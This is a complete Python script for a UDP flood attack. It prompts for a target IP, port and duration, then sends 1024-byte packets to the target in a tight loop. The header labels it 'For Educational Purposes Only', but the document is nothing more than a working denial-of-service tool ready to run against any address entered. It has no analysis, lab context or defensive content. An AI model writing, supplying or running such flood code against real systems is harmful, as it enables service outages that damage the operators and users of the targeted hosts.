# UDP Flood Script (For Educational Purposes Only)
import socket
import time

target_ip = input("Enter the target IP address: ")  # Replace with the IP address of your target
target_port = int(input("Enter the target port: "))  # Replace with the port of your target service
duration = int(input("Enter the duration of the attack in seconds: "))  # Duration of the attack in seconds

# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Prepare a dummy payload
payload = b"\x41" * 1024  # Adjust payload size as needed

timeout = time.time() + duration
sent_packets = 0

print(
    f"Starting UDP flood attack on {target_ip}:{target_port} for {duration} seconds..."
)

while True:
    if time.time() > timeout:
        break
    sock.sendto(payload, (target_ip, target_port))
    sent_packets += 1

print(f"Attack finished. Sent {sent_packets} UDP packets.")
sock.close()
